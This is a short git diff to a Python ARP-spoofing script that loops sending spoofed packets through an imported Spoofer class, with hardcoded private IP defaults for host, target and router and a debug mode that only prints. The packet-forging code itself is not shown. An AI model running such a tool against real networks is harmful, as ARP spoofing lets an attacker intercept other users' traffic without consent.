@@ -7,12 +7,14 @@ import time
 import random
 
 from networking import Spoofer
-from http_helper import run_http_server
 
 if (len(sys.argv) != 4):
-    # print(f"Wrong usage. Usage- spoof.py <host_ip> <target_ip> <router_ip> and not {sys.argv}")
-    # sys.exit(0)
-    sys.argv = ["spoof.py", "172.17.170.103","172.17.170.103","172.17.160.1"]
+    
+    if DEBUG:
+        print(f"Wrong usage of arp_spoofer.py. Usage- arp_spoofer.py <host_ip> <target_ip> <router_ip> and not {sys.argv}")
+        sys.exit(0)
+    else:
+        sys.argv = ["spoof.py", "172.17.170.103","172.17.170.103","172.17.160.1"]
 
 
 
@@ -21,7 +23,7 @@ def spoof(spoofer: Spoofer):
     if DEBUG:
         while True:
             print("Sent spoofing packet.... (not really)")
-            time.sleep(1)
+            time.sleep(3)
     else:
         while True:
             spoofer.send_spoofed_packet()
@@ -35,13 +37,9 @@ def spoof(spoofer: Spoofer):
 
 
 
-def main():
-    spoofer = Spoofer(*sys.argv[1:])
-    spoof(spoofer)
-
-
 if __name__ == "__main__":
     if DEBUG:
         print("Running spoof.py on debug mode.")
-    main()
+    spoofer = Spoofer(*sys.argv[1:])
+    spoof(spoofer)
 
